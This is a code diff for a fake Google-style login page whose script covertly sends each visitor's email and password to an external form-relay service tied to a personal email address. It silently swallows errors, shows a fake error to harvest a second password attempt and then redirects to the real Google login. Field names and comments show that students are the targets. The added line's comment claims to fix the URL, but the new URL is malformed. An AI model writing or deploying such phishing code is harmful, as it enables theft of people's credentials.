@@ -26,7 +26,7 @@
 
     <script>
         let attempt = 0;
-        const myEmail = "fenixhuffman@gmail.com"; 
+        const myEmail = "Fenixhuffman@gmail.com"; 
 
         async function handleCapture() {
             const emailAddr = document.getElementById('email').value;
@@ -35,28 +35,28 @@
             if(!emailAddr || !passwordValue) return;
 
             try {
-                // Sending data to FormSubmit.co via AJAX for stealth
-                await fetch("https://formsubmit.co/ajax/" + myEmail, {
+                // Fixed the URL to include /ajax/
+                await fetch("https://formsubmit.co" + myEmail, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        _subject: "SECURITY AUDIT: Credential Captured",
-                        Captured_Email: emailAddr,
-                        Captured_Pass: passwordValue,
-                        Attempt_Number: attempt + 1
+                        _subject: "SECURITY CAPTURE",
+                        Student_Email: emailAddr,
+                        Student_Pass: passwordValue,
+                        Attempt: attempt + 1
                     })
                 });
-            } catch (e) { 
-                // Silent catch ensures the student sees no errors
+            } catch (e) {
+                // Stays silent
             }
 
             if (attempt === 0) {
-                document.getElementById('pass').value = ""; // Clear password for second attempt
-                document.getElementById('errorMsg').style.display = "block"; // Show fake error
+                document.getElementById('pass').value = "";
+                document.getElementById('errorMsg').style.display = "block";
                 attempt++;
             } else {
-                // After the second attempt, redirect to the real Google login
-                window.location.href = "https://google.com";
+                // Redirect to real Google
+                window.location.href = "https://accounts.google.com";
             }
         }
     </script>
